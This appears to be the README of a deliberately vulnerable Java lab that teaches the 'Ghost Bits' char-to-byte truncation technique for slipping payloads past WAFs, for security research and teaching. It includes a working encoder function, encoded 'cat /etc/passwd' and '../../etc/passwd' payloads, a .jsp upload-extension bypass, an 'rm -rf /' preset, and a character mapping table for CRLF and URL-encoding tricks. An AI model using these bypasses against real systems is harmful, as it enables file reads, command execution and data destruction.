# Ghost Bits Cast Attack Lab

基于 Black Hat ASIA 2026 《Cast Attack: A New Threat Posed by Ghost Bits in Java》 的交互式安全实验靶机。

## 原理

Java 的 `char` 是 **16 位**，当被强转为 `byte`（8 位）时，高 8 位被静默丢弃，只保留低 8 位。攻击者利用 Unicode 字符的低字节映射，让安全检查（WAF）看到的是无害的中文字符，而底层执行时变成危险的 ASCII 字符。

```
陪 (U+966A)  →  低 8 位 = 0x6A  →  'j'
阮 (U+962E)  →  低 8 位 = 0x2E  →  '.'
严 (U+4E25)  →  低 8 位 = 0x25  →  '%'
瘍 (U+760D)  →  低 8 位 = 0x0D  →  '\r'
瘊 (U+760A)  →  低 8 位 = 0x0A  →  '\n'
```

核心代码：

```java
// Ghost Bits 转换 — 高 8 位被丢弃
byte b = (byte) charValue;
// 等价于
int lowByte = charValue & 0xFF;
```

攻击链：

```
攻击者输入 Unicode 字符
    ↓
WAF / 业务校验看到乱码、中文、奇怪字符
    ↓
校验通过
    ↓
底层 Java 代码执行 char → byte 截断
    ↓
低 8 位变成危险 ASCII 字符
    ↓
触发 SQL 注入 / 文件上传 / 路径穿越 / SMTP 注入 / XSS ...
```

## 快速开始

### 方式一：本地运行（需要 Java 17+ 和 Maven）

```bash
git clone https://github.com/<your-username>/ghost-bits-lab.git
cd ghost-bits-lab
mvn package -DskipTests
java -jar target/ghost-bits-lab-1.0.0.jar
```

### 方式二：Docker 运行

```bash
git clone https://github.com/<your-username>/ghost-bits-lab.git
cd ghost-bits-lab
docker compose up --build
```

启动后浏览器打开 **http://localhost:8080**

## 实验模块

### 1. Char → Byte Explorer

输入任意文本，逐字符展示 `(byte) char` 截断过程：

| 字符 | Unicode | 完整值 | 低字节 | 结果 | Ghost? |
|------|---------|--------|--------|------|--------|
| 陪   | U+966A  | 0x966A | 0x6A  | j    | YES    |
| .    | U+002E  | 0x002E | 0x2E  | .    | no     |

### 2. WAF Bypass

输入 Ghost Bits 编码的 payload，对比 WAF 和后端看到的内容：

```
输入: 陣陡陴阠阯陥陴陣阯陰陡陳陳陷除
WAF:  未检测到危险内容 ✅ 通过
后端: cat /etc/passwd           ⚠️ 危险！
结果: BYPASS SUCCESSFUL
```

预设 payload 一键测试：`cat /etc/passwd`、SQL 注入、XSS、路径穿越、`rm -rf /`

### 3. File Upload Bypass

上传文件名包含 Ghost Bits 字符的文件：

```
原始文件名: 1.陪sp     → WAF: 扩展名安全 ✅
保存文件名: 1.jsp      → 后端: 危险扩展名 ⚠️
```

### 4. Path Traversal

用 Ghost Bits 编码路径穿越：

```
输入:     阮阮阯阮阮阯陥陴陣阯陰陡陳陳陷除
WAF:      路径安全 ✅
后端解析: ../../etc/passwd ⚠️
```

### 5. Ghost Bits Dictionary

常用危险字符的 Ghost Bits 映射表，点击可复制。

## 项目结构

```
ghost-bits-lab/
├── pom.xml                                        # Maven 配置
├── Dockerfile                                     # Docker 多阶段构建
├── docker-compose.yml
├── src/main/java/com/lab/ghostbits/
│   ├── GhostBitsLabApplication.java               # 启动类
│   ├── controller/LabController.java              # REST API
│   └── service/GhostBitsService.java              # Ghost Bits 核心逻辑
└── src/main/resources/
    ├── application.properties
    └── static/index.html                          # 前端页面
```

## API

| 端点 | 方法 | 说明 |
|------|------|------|
| `/api/transform` | POST | 字符逐个转换分析 |
| `/api/waf-bypass` | POST | WAF 绕过检测 |
| `/api/upload` | POST | 文件上传扩展名绕过 |
| `/api/read-file?path=` | GET | 路径穿越绕过 |

## Ghost Bits 编码原理

任意 ASCII 字符（码值 N），都可以找到一个 Unicode 字符使其低 8 位等于 N：

```javascript
// JavaScript 编码函数
function ghostEncode(asciiText) {
  return [...asciiText].map(c => {
    const code = c.charCodeAt(0);
    return code <= 0x7F
      ? String.fromCharCode((0x96 << 8) | code)
      : c;
  }).join('');
}

ghostEncode("cat /etc/passwd")
// → "陣陡陴阠阯陥陴陣阯陰陡陳陳陷除"
```

```java
// Java 解码 — 就是 Ghost Bits 截断本身
String decoded = new String(bytes, StandardCharsets.ISO_8859_1);
// 其中 bytes[i] = (byte) input.charAt(i)
```

## 常见 Ghost Bits 字符

| Unicode | 字符 | 低字节 | ASCII | 危险用途 |
|---------|------|--------|-------|----------|
| U+966A  | 陪   | 0x6A   | j     | JSP 绕过 |
| U+962E  | 阮   | 0x2E   | .     | 路径穿越 |
| U+4E25  | 严   | 0x25   | %     | URL 编码 |
| U+7075  | 灵   | 0x75   | u     | URL 编码 |
| U+4E30  | 丰   | 0x30   | 0     | URL 编码 |
| U+7532  | 甲   | 0x32   | 2     | URL 编码 |
| U+6765  | 来   | 0x65   | e     | URL 编码 |
| U+760D  | 瘍   | 0x0D   | \r    | CRLF 注入 |
| U+760A  | 瘊   | 0x0A   | \n    | CRLF 注入 |

## 技术栈

- Java 17 + Spring Boot 3.2
- Maven
- Docker (可选)

## 免责声明

本项目仅供安全研究和教学使用。请勿用于未经授权的系统测试。

## 参考资料

- Black Hat ASIA 2026 - Cast Attack: A New Threat Posed by Ghost Bits in Java
- [Ghost_Bits_Cast_Attack_通俗解读.pdf](../Ghost_Bits_Cast_Attack_通俗解读.pdf)
